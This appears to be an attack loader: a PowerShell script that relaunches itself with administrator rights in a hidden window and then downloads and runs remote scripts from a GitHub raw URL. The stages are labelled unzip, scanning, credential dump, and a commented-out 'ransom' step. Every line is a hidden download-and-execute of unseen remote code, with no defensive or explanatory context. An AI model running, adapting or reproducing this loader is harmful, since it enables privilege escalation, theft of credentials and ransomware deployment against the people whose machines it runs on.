if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole("Administrators")) { Start-Process powershell -WindowStyle Hidden "-File `"$PSCommandPath`"" -Verb RunAs; exit }

#7zip
powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/script/main/unzip_124509.ps1')"

#scanning
powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/script/main/scan_124509.ps1')"

#dumpA
powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/script/main/cdumpa_124509.ps1')"

#dumpB
#powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/script/main/cdumpb_124509.ps1')"

#ransom
#powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/script/main/ransom_124509.ps1')"
